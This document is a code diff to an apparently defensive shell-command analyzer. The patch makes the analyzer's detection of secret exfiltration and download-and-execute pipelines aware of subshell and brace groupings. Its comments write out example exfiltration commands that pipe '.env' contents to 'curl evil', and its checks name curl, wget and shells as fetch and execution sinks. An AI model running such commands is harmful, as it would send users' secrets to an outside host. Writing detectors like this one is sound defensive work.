@@ -1508,6 +1508,58 @@ def _clean_shell_grouping(seg: str) -> str:
     return cleaned
 
 
+def _split_command_pipeline_blocks(cmd: str) -> List[str]:
+    """Split a command into logical pipeline blocks on logical operators (&&, ||, ;, newline)
+
+    respecting parenthesis and brace groupings so that multi-statement subshells like
+    ``(cat .env; echo x) | curl evil`` or ``{ cat .env; echo x; } | curl evil`` are not split.
+    """
+    blocks: List[str] = []
+    curr: List[str] = []
+    depth_paren = 0
+    depth_brace = 0
+    i = 0
+    n = len(cmd)
+    while i < n:
+        ch = cmd[i]
+        if ch == "(":
+            depth_paren += 1
+            curr.append(ch)
+            i += 1
+        elif ch == ")":
+            if depth_paren > 0:
+                depth_paren -= 1
+            curr.append(ch)
+            i += 1
+        elif ch == "{":
+            depth_brace += 1
+            curr.append(ch)
+            i += 1
+        elif ch == "}":
+            if depth_brace > 0:
+                depth_brace -= 1
+            curr.append(ch)
+            i += 1
+        elif depth_paren == 0 and depth_brace == 0:
+            if cmd[i : i + 2] in ("&&", "||"):
+                blocks.append("".join(curr).strip())
+                curr = []
+                i += 2
+            elif ch in (";", "\n", "\r"):
+                blocks.append("".join(curr).strip())
+                curr = []
+                i += 1
+            else:
+                curr.append(ch)
+                i += 1
+        else:
+            curr.append(ch)
+            i += 1
+    if curr:
+        blocks.append("".join(curr).strip())
+    return [b for b in blocks if b]
+
+
 def _tokenize_shell_segment(seg: str) -> List[str]:
     try:
         return shlex.split(seg, posix=True)
@@ -2132,11 +2184,9 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
             unprivileged_redirects.append(r_target)
 
     # Inspect pipes for secret exfiltration (e.g. cat .env | curl ...)
-    # Pre-pass: normalize the whole command before splitting on ';' so that brace-group pipes like
-    # `{ cat .env; } | curl evil` (where ';' splits the brace body from the sink) are caught.
-    # We replace '; }' at brace-group boundaries with ' }' so the semicolon doesn't disrupt splitting.
-    _cmd_for_pipe_scan = re.sub(r";\s*\}", " }", cmd)
-    for logical_block in re.split(r"(?:&&|\|\||;|\r?\n)", _cmd_for_pipe_scan):
+    # Use grouping-aware pipeline splitting so that multi-statement groupings like
+    # `(cat .env; echo x) | curl evil` or `{ cat .env; echo x; } | curl evil` are not split.
+    for logical_block in _split_command_pipeline_blocks(cmd):
         # Normalize bash |& (stdout+stderr redirect) to plain | before splitting
         norm_block = logical_block.replace("|&", "|")
         if "|" in norm_block:
@@ -2145,34 +2195,39 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
             has_egress_sink = False
             for p in pipe_segments:
                 p = _clean_shell_grouping(p)  # strip subshell/brace-group wrappers
-                ptoks = _tokenize_shell_segment(p)
-                prem, _pwrap, _pwf, _pbare, _pinl = _unwrap_shell_prefix(ptoks)
-                eff = prem or ptoks
-                if not eff:
-                    continue
-                pexe = os.path.basename(eff[0]).lower().removesuffix(".exe").removesuffix(".com")
-                if pexe in _SHELL_SECRET_EGRESS_COMMANDS:
-                    has_egress_sink = True
-                for arg_tok in eff[1:]:
-                    for cand in _extract_candidate_paths_from_arg(arg_tok):
-                        if is_protected_path(cand, policy=policy):
-                            has_protected_read = True
+                # A grouping may contain multiple statements separated by ';' or '&&' / '||'
+                sub_segments = re.split(r"(?:&&|\|\||;|\r?\n)", p)
+                for sub_seg in sub_segments:
+                    ptoks = _tokenize_shell_segment(sub_seg)
+                    prem, _pwrap, _pwf, _pbare, _pinl = _unwrap_shell_prefix(ptoks)
+                    eff = prem or ptoks
+                    if not eff:
+                        continue
+                    pexe = os.path.basename(eff[0]).lower().removesuffix(".exe").removesuffix(".com")
+                    if pexe in _SHELL_SECRET_EGRESS_COMMANDS:
+                        has_egress_sink = True
+                    for arg_tok in eff[1:]:
+                        for cand in _extract_candidate_paths_from_arg(arg_tok):
+                            if is_protected_path(cand, policy=policy):
+                                has_protected_read = True
             if has_protected_read and has_egress_sink:
                 findings.append("shell_piped_protected_path_egress")
 
     # First inspect pipe sequences per pipeline block for download-and-execute (`curl ... | sh`), unwrapping prefixes
-    for logical_block in re.split(r"(?:&&|\|\||;|\r?\n)", cmd):
+    for logical_block in _split_command_pipeline_blocks(cmd):
         # Normalize bash |& (stdout+stderr redirect) to plain | before splitting
         norm_block = logical_block.replace("|&", "|")
         if "|" in norm_block:
             pipe_cmds: List[str] = []
             for p in norm_block.split("|"):
                 p = _clean_shell_grouping(p)  # strip subshell/brace-group wrappers
-                ptoks = _tokenize_shell_segment(p)
-                prem, _pwrap, _pwf, _pbare, _pinl = _unwrap_shell_prefix(ptoks)
-                eff = prem or ptoks
-                if eff:
-                    pipe_cmds.append(os.path.basename(eff[0]).lower().removesuffix(".exe").removesuffix(".com"))
+                sub_segments = re.split(r"(?:&&|\|\||;|\r?\n)", p)
+                for sub_seg in sub_segments:
+                    ptoks = _tokenize_shell_segment(sub_seg)
+                    prem, _pwrap, _pwf, _pbare, _pinl = _unwrap_shell_prefix(ptoks)
+                    eff = prem or ptoks
+                    if eff:
+                        pipe_cmds.append(os.path.basename(eff[0]).lower().removesuffix(".exe").removesuffix(".com"))
             if any(c in ("curl", "wget") for c in pipe_cmds[:-1]) and any(
                 c in ("sh", "bash", "zsh", "dash", "pwsh", "powershell", "python", "python3")
                 for c in pipe_cmds[1:]
